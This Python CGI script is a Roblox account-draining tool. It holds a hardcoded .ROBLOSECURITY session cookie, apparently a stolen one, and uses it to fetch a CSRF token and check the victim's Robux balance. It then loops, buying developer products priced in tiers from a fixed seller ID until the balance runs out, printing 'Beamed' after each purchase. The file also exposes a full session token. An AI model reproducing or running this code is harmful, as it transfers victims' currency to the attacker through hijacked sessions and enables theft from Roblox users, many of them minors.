#! C:\Users\Emir\AppData\Local\Programs\Python\Python311\python.exe
print("Content-Type: text/html\n")
import cgi
form = cgi.FieldStorage()
import requests
import json
import click
import time

Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_FC195566C57217466070E54F3EBE0E52F0B179E3244D764FACA30ADB6FADEFE919BFF6086D78F978166F674EFB963D751773B163BC40CC527742F21DF4BE0779D77D26483B0D56946859BE3B9BE31DF66BEABA0D273369858F9BB206AEF0FF0A434046F1A91579349C5C4935E578FF797C0B7E31E74D5FA566D2B4ED5E3BC95CCCE42213DA3FDAC4CE2EA5A5AA65555D31F671263CC8D7317082E02D76460C00CD23594294744FDB21C03F9BE4C10F1486C49216E208859557A7B4CA4C1555801C103C313C4AA8DD6FCF3977162C147D04C193921C1E2A77AA648EC93C594B512C8D032064DA1744F4B1F81112E3E9B727AB3B8E4781820976643F610AE988314152CAA65683735214EB1B223CE2C67AAB0F12A047B7E7290742DFDFC5C8017B89E6E6B7DB63F556EB56C0004C66D66FC4B58B54482E0BB80630D734214307239F94E0FDDA5FD5080A7ADFE96C0F5037EA5F6C7D732F4C40DE5DED4F1BCD40D1E54133BC5AF753FC01B1C3790EF34D2A1B9A0109D8B861D89D78560299AC2E0FBC46545FF2277C6B7845CA83FFB17509C004120E95AE2C70AE951EF065CECAEC0987DB100585D751F566314A253B08DE90029D0BA33FFC18F5A2A394901062205AB20DE79D7AE9C0C201E133DBBE0F63214C3EBB9B501B984A8CE922D58E67CBF3B976AE4DBC02FD799967D15B6761BFF0CFE3FD7D45D08D16D3EB42F7DAF26A39674EF476E79BB9A89E7D9F6AECD036DE6F6F900A1E255AF82DD5EBD823CFB030D0B8D1E1E8FF2F5BF442071043B9AEC7A05ECCEB105B0E9B33601D7CBD7A5A2F340B0B9FCB2AFE91FDA9FED1AE00F2687A5F4560A60261E98B9CEDFFCC6BC15001D338480CC0DD67581DEA4CE092A05977FF483E840FDF7F5B3F08F7506668A77F0F88E5A2D67B1F88B7601A25BFC52D93B7B5FA4B8E0D1F9DCBFB712DB2265709FAD2EEAD5084B29ACA7C10E509125D07979304C57CF900E62F6CF9534C88390EE0E3B9BE63BE418B651D4FCDEB7739298541427E020895E6440043FB670177D3576E" 
XCSRF = requests.post("https://accountsettings.roblox.com/v1/email", cookies = {".ROBLOSECURITY": Cookie}).headers.get("x-csrf-token")

##########################
headers = {
    "Content-Type": "application/json;charset=UTF-8", 
    "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0", 
    "origin": "https://www.roblox.com", 
    "referer": "https://www.roblox.com/",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "cookie": ".ROBLOSECURITY="+Cookie, 
}
Info = {}
UserInfo = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers).json()
UserId= UserInfo["id"]
Info["robux"] = int(requests.get("https://economy.roblox.com/v1/users/"+str(UserId)+"/currency", headers=headers).json()["robux"])

click.clear()
print("Madness On Top!\n")
print(Info)
headers1 = {
    "cookie": f".ROBLOSECURITY={Cookie}",
    "x-csrf-token": XCSRF,
    "content-type": "application/json"
}
while True:
    if Info["robux"]<10:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 2
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520660334", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Done")
            break
        else:
            print("Beamed 2")
    elif Info["robux"]>9 and Info['robux']<50:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 10
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520660505", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 10")
    elif Info['robux']>49 and Info['robux']<100:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 50
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520660611", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 50")
    elif Info['robux']>99 and Info['robux']<500:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 100
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520660707", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 100")
    elif Info["robux"]>499 and Info["robux"]<1000:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 500
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520660834", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 500")
    elif Info['robux']>999 and Info['robux']<5000:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 1000
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520660933", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 1000")
    elif Info['robux']>4999 and Info['robux']<10000:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 5000
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520661028", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 5000")
    elif Info['robux']>9999:
        payload = {
            "expectedSellerId": 87337185,
            "expectedCurrency": 1,
            "expectedPrice": 10000
        }
        buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/1520661122", headers = headers1, data = json.dumps(payload))
        if "errorMsg" in buyres.json():
            print("Error")
            print(buyres.json())
        else:
            print("Beamed 10000")
    Info["robux"] = int(requests.get("https://economy.roblox.com/v1/users/"+str(UserId)+"/currency", headers=headers).json()["robux"])